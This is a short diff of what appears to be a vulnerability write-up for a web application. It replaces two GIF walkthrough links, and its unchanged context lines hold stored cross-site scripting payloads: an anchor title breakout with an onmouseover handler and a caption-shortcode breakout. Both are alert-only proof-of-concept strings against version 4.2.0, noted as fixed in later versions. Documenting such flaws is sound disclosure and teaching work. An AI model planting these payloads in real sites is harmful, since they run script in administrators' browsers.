@@ -20,7 +20,7 @@ privileges on that web application.
     - Tested in version: 4.2.0
     - Fixed in version: 4.2.1
   - [x] GIF Walkthrough:  
-  ![gif1](https://i.imgur.com/a/nEKiWlx.gif)
+  ![gif1](https://i.imgur.com/oV9s45N.gif)
   - [x] Steps to recreate: 
         1. post " <a title='x onmouseover=alert(unescape(/hello%20world/.source))
 style=position:absolute;left:0;top:0;width:5000px;height:5000px
@@ -40,7 +40,7 @@ The malicious script is executed when an administrator views the page. From this
     - Tested in version: 4.2.0
     - Fixed in version:  4.2.3
   - [x] GIF Walkthrough: 
-  ![gif2](https://i.imgur.com/a/U65Gbiz.gif)
+  ![gif2](https://i.imgur.com/8r1Wnau.gif)
   - [x] Steps to recreate: 
   1.  entered "<a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>
 " in a page or posting using the HTML edit mode. 
